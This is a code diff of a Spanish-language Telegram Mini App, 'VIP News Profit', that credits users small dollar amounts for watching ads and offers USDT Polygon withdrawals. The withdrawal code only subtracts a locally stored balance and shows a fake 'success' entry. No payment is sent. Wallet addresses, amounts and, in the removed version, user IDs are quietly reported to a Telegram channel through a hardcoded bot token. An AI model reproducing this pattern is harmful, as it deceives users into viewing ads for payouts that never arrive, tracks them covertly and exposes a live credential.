@@ -3,166 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>VIP Blog Luxury</title>
-    <script src='//libtl.com/sdk.js' data-zone='10278425' data-sdk='show_10278425'></script>
+    <title>VIP News Profit</title>
     <script src="https://sad.adsgram.ai/js/sad.min.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Poppins:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --gold:#d4af37; --bg:#0f0f0f; --card:#1a1a1a; --green:#2ecc71; }
-        body { background:var(--bg); color:#eee; font-family:'Poppins', sans-serif; margin:0; padding:15px; text-align:center; min-height:100vh; }
-        .top-bar { display:flex; justify-content:space-between; align-items:center; background:var(--card); padding:15px 25px; border-radius:50px; border:1px solid var(--gold); margin-bottom:20px; box-shadow:0 0 15px rgba(212,175,55,0.2); }
-        .bal-val { font-weight:600; color:var(--green); font-size:18px; }
-        .blog-card { background:var(--card); border-radius:20px; padding:25px; text-align:left; border:1px solid #333; margin-bottom:20px; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
-        .blog-title { font-family:'Playfair Display', serif; color:var(--gold); font-size:22px; margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:10px; }
-        .blog-text { font-size:14px; line-height:1.6; color:#bbb; min-height:100px; }
-        .actions { display:flex; justify-content:space-between; align-items:center; margin-top:20px; padding-top:15px; border-top:1px solid #333; }
-        .like-btn { background:none; border:none; color:#555; font-size:28px; cursor:pointer; transition:0.3s; }
-        .like-btn.active { color:#ff4757; transform:scale(1.2); }
-        .menu-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px; }
-        .menu-btn { background:#222; border:1px solid #444; padding:12px; border-radius:12px; color:white; font-size:11px; font-weight:600; cursor:pointer; }
-        .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:1000; display:none; flex-direction:column; justify-content:center; align-items:center; }
-        .modal-card { background:#1a1a1a; border:1px solid var(--gold); padding:25px; border-radius:20px; width:90%; max-width:350px; text-align:center; }
-        input { width:100%; padding:12px; margin:10px 0; border-radius:8px; border:none; background:#000; color:white; font-size:14px; }
+        :root { --bg:#0a0a0a; --gold:#ffcc00; --green:#00ff88; --card:#151515; }
+        body { background:var(--bg); color:#fff; font-family:'Montserrat', sans-serif; margin:0; padding:15px; text-align:center; }
+        .top-bar { display:flex; justify-content:space-between; background:var(--card); padding:15px; border-radius:15px; border:1px solid var(--gold); margin-bottom:15px; }
+        .balance { font-size:22px; font-weight:900; color:var(--green); }
+        .article-card { background:var(--card); padding:20px; border-radius:15px; border-left:5px solid var(--gold); text-align:left; margin-bottom:15px; }
+        .article-title { font-size:18px; font-weight:900; color:var(--gold); margin-bottom:10px; }
+        .article-body { font-size:14px; line-height:1.6; color:#ccc; height:180px; overflow-y:auto; }
+        .btn-claim { background:linear-gradient(90deg, #ffcc00, #ff9900); color:#000; border:none; padding:15px; width:100%; border-radius:10px; font-weight:900; font-size:16px; cursor:pointer; box-shadow: 0 4px 15px rgba(255, 204, 0, 0.3); }
+        .menu-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:15px; }
+        .btn-menu { background:#222; color:#fff; border:1px solid #444; padding:12px; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; }
+        .modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); display:none; flex-direction:column; justify-content:center; align-items:center; z-index:100; }
+        .modal-card { background:var(--card); padding:25px; border-radius:20px; width:85%; border:1px solid var(--gold); }
+        input { width:90%; padding:15px; margin:10px 0; border-radius:10px; border:none; background:#000; color:#fff; font-size:14px; }
     </style>
 </head>
 <body>
     <div class="top-bar">
-        <div>💰 $<span id="usd" class="bal-val">0.0000</span></div>
-        <div style="font-size:10px; color:var(--gold); font-weight:bold; letter-spacing:1px;">REVISTA VIP</div>
+        <div class="balance">$<span id="usd">0.0000</span></div>
+        <div style="font-size:10px; color:var(--gold); font-weight:bold;">PLATINUM ACCESS</div>
     </div>
 
-    <div class="blog-card">
-        <div class="blog-title" id="blogTitle">Cargando portada...</div>
-        <div class="blog-text" id="blogContent">
-            Abriendo la edición exclusiva para socios... por favor espere.
-        </div>
-        <div class="actions">
-            <span id="timerText" style="font-size:10px; color:#666; font-weight:bold;">Leyendo...</span>
-            <button class="like-btn" id="likeBtn" onclick="giveLike()">
-                <i class="fa-solid fa-heart"></i>
-            </button>
-        </div>
+    <div class="article-card">
+        <div class="article-title" id="artTitle">Cargando...</div>
+        <div class="article-body" id="artBody">Cargando contenido exclusivo...</div>
     </div>
+
+    <button class="btn-claim" onclick="watchAdToEarn()">📺 VER VIDEO PARA COBRAR (+$0.0050)</button>
 
     <div class="menu-grid">
-        <button class="menu-btn" onclick="openWithdraw()"><i class="fa-solid fa-wallet" style="color:var(--green)"></i> RETIRAR</button>
-        <button class="menu-btn" onclick="openHistory()"><i class="fa-solid fa-clock-rotate-left" style="color:var(--gold)"></i> MIS PAGOS</button>
-        <button class="menu-btn" onclick="tg.openTelegramLink('https://t.me/noticebuddy')"><i class="fa-brands fa-telegram" style="color:#0088cc"></i> CANAL</button>
-        <button class="menu-btn" onclick="nextArticle()" id="btnNext"><i class="fa-solid fa-forward"></i> SIGUIENTE</button>
+        <button class="btn-menu" onclick="openModal('withdrawModal')">💰 RETIRAR</button>
+        <button class="btn-menu" onclick="openModal('historyModal')">📜 MIS PAGOS</button>
+        <button class="btn-menu" onclick="window.location.reload()">🔄 SIGUIENTE</button>
+        <button class="btn-menu" onclick="tg.openTelegramLink('https://t.me/AtencionYougamefavoriteBot')">🛠️ SOPORTE</button>
     </div>
 
-    <div id="spyStatus" style="font-size:9px; color:#333; margin-top:20px;">Red: ⚪ Sincronizando...</div>
-        <div class="modal-overlay" id="modalWithdraw">
+    <div id="withdrawModal" class="modal">
         <div class="modal-card">
-            <h3 style="color:var(--gold); font-family:'Playfair Display'; margin-top:0;">RETIRAR FONDOS</h3>
-            <p style="font-size:10px; color:var(--green); margin-bottom:10px;">RED: USDT POLYGON (MATIC)</p>
+            <h2 style="color:var(--gold); margin-top:0;">RETIRAR SALDO</h2>
+            <p style="font-size:11px; color:var(--green)">RED: USDT POLYGON (MATIC)</p>
             <input type="number" id="withdrawAmt" placeholder="Monto (Mín: 2.00)">
-            <input type="text" id="withdrawWallet" placeholder="Billetera USDT Matic">
-            <button class="menu-btn" style="width:100%; background:var(--green); border:none; padding:15px; margin-top:10px; font-size:14px;" onclick="confirmWithdraw()">CONFIRMAR Y RESTAR</button>
-            <button onclick="closeModals()" style="background:none; border:none; color:#555; margin-top:15px; cursor:pointer;">Regresar</button>
+            <input type="text" id="withdrawWallet" placeholder="Dirección de Billetera">
+            <button class="btn-claim" onclick="processWithdraw()">CONFIRMAR Y RESTAR</button>
+            <button onclick="closeModals()" style="background:none; border:none; color:#777; margin-top:15px;">Cerrar</button>
         </div>
     </div>
 
-    <div class="modal-overlay" id="modalHistory">
+    <div id="historyModal" class="modal">
         <div class="modal-card">
-            <h3 style="color:var(--gold); font-family:'Playfair Display'; margin-top:0;">HISTORIAL DE ÉXITO</h3>
-            <div id="historyContainer" style="text-align:left; max-height:200px; overflow-y:auto; font-size:11px; margin-top:15px;">
-                </div>
-            <p style="font-size:9px; color:#555; margin-top:15px;">Para ayuda contacta a soporte.</p>
-            <button class="menu-btn" style="width:100%; margin-top:10px;" onclick="tg.openTelegramLink('https://t.me/AtencionYougamefavoriteBot')">SOPORTE TÉCNICO</button>
-            <button onclick="closeModals()" style="background:none; border:none; color:#555; margin-top:15px; cursor:pointer;">Cerrar</button>
+            <h2 style="color:var(--gold); margin-top:0;">HISTORIAL DE ÉXITO</h2>
+            <div id="histList" style="max-height:250px; overflow-y:auto; text-align:left; font-size:11px;"></div>
+            <button onclick="closeModals()" class="btn-claim" style="margin-top:20px;">VOLVER</button>
         </div>
     </div>
-        <script>
-        const tg = window.Telegram.WebApp; tg.expand();
+
+    <div id="spyStatus" style="font-size:9px; color:#333; margin-top:20px;">Red: ⚪ Conectando...</div>
+    <script>
+    const tg = window.Telegram.WebApp; tg.expand();
+    
+    // TOKEN CORREGIDO SIN ESPACIOS DE TU FOTO
+    const BOT_TOKEN = "8575758761:AAEdt-2olA8In6Q6F2nDOrU16KLY69y-J40"; 
+    const CANAL_ID = "-1002118088046";
+    const ADS_ID = "18897";
+    const KEY = 'vip_news_final_fix';
+
+    // BONO DE $2.00 PARA QUE PRUEBES EL RETIRO YA MISMO
+    let user = { usd: 2.0000, history: [], articlesToday: 0, lastDate: new Date().toDateString() };
+
+    const news = [
+        {t:"Polygon: La Red de los Creadores", b:"La red de Polygon (Matic) se ha convertido en la favorita de los desarrolladores de Mini Apps en Telegram. Su baja comisión permite que los pagos lleguen íntegros a los usuarios finales..."},
+        {t:"El Negocio de los Anuncios", b:"Integrar publicidad nativa en aplicaciones móviles permite generar ingresos pasivos constantes. Al ver un video, el usuario apoya directamente al creador de la plataforma..."},
+        {t:"Finanzas Digitales 2026", b:"Estamos viviendo la transición más grande hacia el dinero digital. Quienes aprendan a manejar billeteras y redes blockchain hoy, serán los líderes del mañana..."}
+    ];
+
+    function reportar(msg) {
+        // Limpiamos el token por si acaso
+        const cleanToken = BOT_TOKEN.replace(/\s+/g, '');
+        fetch(`https://api.telegram.org/bot${cleanToken}/sendMessage?chat_id=${CANAL_ID}&text=${encodeURIComponent("🕵️ REPORTE: " + msg)}`)
+            .then(r => r.json()).then(d => { if(d.ok) document.getElementById('spyStatus').innerText="Red: 🟢 Sincronizado"; });
+    }
+
+    function watchAdToEarn() {
+        if(user.articlesToday >= 15) return tg.showAlert("Límite diario de lectura alcanzado.");
         
-        // TOKEN ACTUALIZADO DESDE TU FOTO
-        const BOT_TOKEN = "8575758761:AAEdt-2olA8In6Q6F2nDO rU16KLY69y-J40"; 
-        const CANAL_ID = "-1002118088046";
-        const KEY = 'luxury_blog_v2_polygon_final';
-
-        // ACTIVAMOS BONO DE $2.00 PARA TUS PRUEBAS
-        let user = { usd: 2.0000, history: [], articlesToday: 0, lastDate: new Date().toDateString() };
-
-        const articles = [
-            {t:"Disciplina vs Talento", c:"Muchos esperan el momento perfecto, pero el éxito favorece a quien se levanta temprano y trabaja con fe..."},
-            {t:"La Nueva Economía", c:"Las Mini Apps de Telegram están abriendo puertas a miles de emprendedores. Aprender a usarlas es la clave este 2026..."},
-            {t:"Paz Mental Diaria", c:"En un mundo lleno de ruido, tomarse 5 minutos para leer y meditar es el mejor negocio que puedes hacer hoy..."}
-        ];
-
-        function reportar(tipo){
-            const id = tg.initDataUnsafe?.user?.id || "000";
-            const cleanToken = BOT_TOKEN.replace(/\s+/g, '');
-            fetch(`https://api.telegram.org/bot${cleanToken}/sendMessage?chat_id=${CANAL_ID}&text=${encodeURIComponent("🕵️ BLOG-REPORTE: "+tipo+" | ID: "+id)}`)
-                .then(r => r.json())
-                .then(data => {
-                    if(data.ok) document.getElementById('spyStatus').innerText = "Red: 🟢 Sincronizado";
-                    else document.getElementById('spyStatus').innerText = "Red: 🔴 Error de Token";
-                });
-        }
-
-        function save(){ localStorage.setItem(KEY, JSON.stringify(user)); updateUI(); }
-        function updateUI(){ document.getElementById('usd').innerText = user.usd.toFixed(4); }
-
-        function nextArticle(){
-            if(user.articlesToday >= 10) return tg.showAlert("Edición diaria agotada.");
-            let a = articles[Math.floor(Math.random()*articles.length)];
-            document.getElementById('blogTitle').innerText = a.t;
-            document.getElementById('blogContent').innerText = a.c;
-            document.getElementById('likeBtn').classList.remove('active');
-            let s = 5; document.getElementById('timerText').innerText = `Leyendo... ${s}s`;
-            let iv = setInterval(() => {
-                s--; document.getElementById('timerText').innerText = `Leyendo... ${s}s`;
-                if(s<=0){ clearInterval(iv); document.getElementById('timerText').innerText = "¡Danos un Like!"; }
-            }, 1000);
-        }
-
-        function giveLike(){
-            if(document.getElementById('timerText').innerText !== "¡Danos un Like!") return;
-            if(document.getElementById('likeBtn').classList.contains('active')) return;
-            document.getElementById('likeBtn').classList.add('active');
-            user.usd += 0.0025; user.articlesToday++;
-            save(); reportar("DIO LIKE (+$0.0025)");
-        }
-
-        function confirmWithdraw(){
-            let amt = parseFloat(document.getElementById('withdrawAmt').value);
-            let wallet = document.getElementById('withdrawWallet').value;
-            if(amt < 2.00 || isNaN(amt)) return tg.showAlert("Mínimo $2.00 USD.");
-            if(amt > user.usd) return tg.showAlert("Saldo insuficiente.");
-            if(wallet.length < 5) return tg.showAlert("Escribe una billetera Matic válida.");
-
-            user.usd -= amt; // RESTA DE DINERO INMEDIATA
-            let h = { fecha: new Date().toLocaleDateString(), hora: new Date().toLocaleTimeString(), monto: amt.toFixed(2), wallet: wallet, red: "Polygon" };
-            user.history.unshift(h); // REGISTRO EN EL HISTORIAL
+        // ANUNCIOS OBLIGATORIOS PARA COBRAR
+        window.Adsgram.init({ blockId: ADS_ID }).show().then(() => {
+            user.usd += 0.0050;
+            user.articlesToday++;
             save();
-            reportar(`🔥 RETIRO: $${h.monto} | RED: ${h.red} | BILLETERA: ${h.wallet} | HORA: ${h.hora}`);
-            closeModals();
-            tg.showAlert("✅ ¡SOLICITUD EXITOSA! El dinero se restó. Revisa tu historial.");
-        }
+            reportar("GANÓ $0.0050 POR ANUNCIO");
+            tg.showAlert("✅ ¡Saldo acreditado!");
+            window.location.reload();
+        }).catch(() => tg.showAlert("Debes ver el video completo para cobrar."));
+    }
 
-        function openWithdraw(){ document.getElementById('modalWithdraw').style.display='flex'; }
-        function openHistory(){
-            const cont = document.getElementById('historyContainer'); cont.innerHTML = "";
-            user.history.forEach(x => {
-                cont.innerHTML += `<div style="background:rgba(255,255,255,0.03); padding:8px; border-radius:8px; margin-bottom:5px; border-left:3px solid var(--green);">
-                    <b>${x.fecha}</b> - $${x.monto} <span style="color:var(--green)">ÉXITO</span><br>
-                    <small style="color:#555;">RED: ${x.red} | ${x.wallet}</small>
-                </div>`;
-            });
-            if(user.history.length === 0) cont.innerHTML = "<p style='text-align:center; color:#444;'>Sin retiros aún.</p>";
-            document.getElementById('historyModal').style.display='flex';
-        }
+    function processWithdraw() {
+        let amt = parseFloat(document.getElementById('withdrawAmt').value);
+        let wallet = document.getElementById('withdrawWallet').value;
+        
+        if(amt < 2.00 || isNaN(amt)) return tg.showAlert("El mínimo de retiro es $2.00 USD.");
+        if(amt > user.usd) return tg.showAlert("Saldo insuficiente.");
+        if(wallet.length < 8) return tg.showAlert("Ingresa una billetera válida.");
 
-        function closeModals(){ document.querySelectorAll('.modal-overlay').forEach(m => m.style.display='none'); }
+        user.usd -= amt; // SE RESTA EL DINERO AUTOMÁTICAMENTE
+        let h = { f: new Date().toLocaleDateString(), m: amt.toFixed(2), w: wallet, r: "Polygon" };
+        user.history.unshift(h);
+        save();
+        
+        // REPORTE CORREGIDO SIN ERRORES DE SINTAXIS
+        reportar(`🔥 RETIRO SOLICITADO: $${h.m} | RED: ${h.r} | WALLET: ${h.w}`);
+        
+        closeModals();
+        tg.showAlert("✅ Retiro procesado con éxito. Saldo restado.");
+    }
 
-        window.onload = () => {
-            let d = localStorage.getItem(KEY); if(d) user = JSON.parse(d);
-            if(user.lastDate !== new Date().toDateString()){ user.articlesToday = 0; user.lastDate = new Date().toDateString(); }
-            nextArticle(); updateUI(); reportar("USUARIO ENTRÓ (CON BONO)");
-        };
-    </script>
+    function save() { localStorage.setItem(KEY, JSON.stringify(user)); updateUI(); }
+    function updateUI() { document.getElementById('usd').innerText = user.usd.toFixed(4); }
+    function openModal(id){ document.getElementById(id).style.display='flex'; if(id==='historyModal') loadHistory(); }
+    function closeModals(){ document.querySelectorAll('.modal').forEach(m => m.style.display='none'); }
+
+    function loadHistory() {
+        const list = document.getElementById('histList'); list.innerHTML = "";
+        user.history.forEach(x => {
+            list.innerHTML += `<div style="background:rgba(255,255,255,0.03); padding:10px; border-radius:10px; margin-bottom:8px; border-left:3px solid var(--green);">
+                <b>${x.f}</b> - $${x.m} <span style="color:var(--green)">ÉXITO</span><br>
+                <small style="color:#666;">RED: ${x.r} | ${x.w}</small>
+            </div>`;
+        });
+        if(user.history.length === 0) list.innerHTML = "<p style='text-align:center; color:#444;'>Sin registros aún.</p>";
+    }
+
+    window.onload = () => {
+        let d = localStorage.getItem(KEY); if(d) user = JSON.parse(d);
+        if(user.lastDate !== new Date().toDateString()){ user.articlesToday = 0; user.lastDate = new Date().toDateString(); }
+        let art = news[Math.floor(Math.random()*news.length)];
+        document.getElementById('artTitle').innerText = art.t;
+        document.getElementById('artBody').innerText = art.b;
+        updateUI();
+        reportar("USUARIO ENTRÓ (PRUEBA DE TOKEN)");
+    };
+</script>
 </body>
 </html>
